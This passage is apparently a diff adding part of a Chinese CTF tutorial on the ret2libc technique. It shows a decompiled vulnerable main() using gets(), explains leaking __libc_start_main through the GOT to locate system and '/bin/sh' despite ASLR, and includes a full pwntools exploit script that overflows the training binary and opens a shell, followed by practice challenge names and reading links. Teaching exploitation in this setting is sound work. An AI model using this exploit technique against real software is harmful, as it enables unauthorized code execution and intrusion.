+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [sp+1Ch] [bp-64h]@1
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts("No surprise anymore, system disappeard QQ.");
+  printf("Can you find it !?");
+  gets((char *)&v4);
+  return 0;
+}
+```
+
+那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点：
+
+- system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
+- 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变（对齐到页框大小，12 位对应常见的 4 KB）。而 libc 在github上有人进行收集，如下
+  - https://github.com/niklasb/libc-database
+
+所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system函数的地址。
+
+那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。**当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。**
+
+我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme：
+
+- https://github.com/lieanu/LibcSearcher
+
+此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。
+
+这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下
+
+- 泄露 __libc_start_main 地址
+- 获取 libc 版本
+- 获取 system 地址与 /bin/sh 的地址
+- 再次执行源程序
+- 触发栈溢出执行 system(‘/bin/sh’)
+
+exp 如下：
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+pc = './ret2libc3'
+aslr = True
+context.log_level = 'debug'  
+context.arch = 'i386' 
+
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+ret2libc3 = ELF('./ret2libc3')
+
+p = process(pc, aslr=aslr)
+
+if __name__ == '__main__':
+    puts_plt = ret2libc3.plt['puts']
+    libc_start_main_got = ret2libc3.got['__libc_start_main']
+    start_addr = ret2libc3.symbols['_start']
+
+    # log.info(f'start_addr --> 0x{start_addr:x}')
+    
+    payload = b'a' * 112
+    payload += p32(puts_plt)
+    payload += p32(start_addr)
+    payload += p32(libc_start_main_got)
+
+    p.sendline(payload)
+    p.recvuntil(b'Can you find it !?')
+
+    libc_start_main_addr = u32(p.recv(4))
+    libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main']
+    system_addr = libc_base_addr + libc.symbols['system']
+
+    binsh_offset = next(libc.search(b'/bin/sh\x00'))
+    binsh_addr = libc_base_addr + binsh_offset
+
+    payload2 = b'a' * 112
+    payload2 += p32(system_addr)
+    payload2 += p32(0xdeadbeef)  
+    payload2 += p32(binsh_addr)  
+    p.sendline(payload2)
+    p.interactive()
+```
+
+### 题目
+
+- train.cs.nctu.edu.tw: ret2libc
+
+## 题目
+
+- train.cs.nctu.edu.tw: rop
+- 2013-PlaidCTF-ropasaurusrex
+- Defcon 2015 Qualifier: R0pbaby
+
+## 参考阅读
+
+- [乌云一步一步ROP篇(蒸米)](http://wooyun.jozxing.cc/static/drops/tips-6597.html)
+- [手把手教你栈溢出从入门到放弃（上）](https://zhuanlan.zhihu.com/p/25816426)
+- [手把手教你栈溢出从入门到放弃（下）](https://zhuanlan.zhihu.com/p/25892385)
+- [【技术分享】现代栈溢出利用技术基础：ROP](http://bobao.360.cn/learning/detail/3694.html)
+
